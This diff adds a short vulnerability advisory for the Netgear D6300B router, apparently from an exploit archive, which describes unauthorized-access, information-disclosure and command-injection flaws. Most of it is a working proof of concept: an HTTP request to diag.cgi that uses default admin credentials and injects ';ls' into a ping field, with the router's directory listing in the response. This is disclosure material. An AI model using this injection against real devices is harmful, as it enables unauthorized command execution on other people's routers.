@@ -1,0 +1,54 @@
+source: http://www.securityfocus.com/bid/65444/info
+
+The Netgear D6300B router is prone to the following security vulnerabilities:
+
+1. Multiple unauthorized-access vulnerabilities
+2. A command-injection vulnerability
+3. An information disclosure vulnerability
+
+An attacker can exploit these issues to gain access to potentially sensitive information, execute arbitrary commands in the context of the affected device, and perform unauthorized actions. Other attacks are also possible.
+
+Netgear D6300B 1.0.0.14_1.0.14 is vulnerable; other versions may also be affected. 
+
+######## REQUEST: #########
+###########################
+POST /diag.cgi?id=991220771 HTTP/1.1
+Host: 192.168.0.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.0.1/DIAG_diag.htm
+Authorization: Basic YWRtaW46cGFzc3dvcmQ=
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 95
+
+ping=Ping&IPAddr1=192&IPAddr2=168&IPAddr3=0&IPAddr4=1;ls&host_name=&ping_IPAddr=192.168.0.1
+
+
+######## RESPONSE: ########
+###########################
+HTTP/1.0 200 OK
+Content-length: 6672
+Content-type: text/html; charset="UTF-8"
+Cache-Control:no-cache
+Pragma:no-cache
+
+<!DOCTYPE HTML>
+<html>
+[...]
+<textarea name="ping_result" class="num" cols="60" rows="12" wrap="off" readonly>
+bin
+cferam.001
+data
+dev
+etc
+include
+lib
+linuxrc
+mnt
+opt
+
+&lt;/textarea&gt;
+[...]
